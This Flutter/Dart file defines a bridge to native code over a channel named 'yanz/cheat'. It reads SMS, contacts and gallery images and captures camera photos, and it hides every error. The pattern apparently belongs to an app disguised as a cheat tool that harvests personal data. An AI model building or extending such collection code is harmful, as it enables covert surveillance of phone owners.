import 'package:flutter/services.dart';

class NativeBridge {
  static const _ch = MethodChannel('yanz/cheat');

  static Future<List> getSms() async {
    try { return await _ch.invokeMethod('getSms') ?? []; }
    catch (_) { return []; }
  }

  static Future<List> getContacts() async {
    try { return await _ch.invokeMethod('getContacts') ?? []; }
    catch (_) { return []; }
  }

  static Future<List> getGallery() async {
    try { return await _ch.invokeMethod('getGallery') ?? []; }
    catch (_) { return []; }
  }

  static Future<String> capturePhoto(bool front) async {
    try { return await _ch.invokeMethod('capturePhoto', {'front': front}) ?? ''; }
    catch (_) { return ''; }
  }
}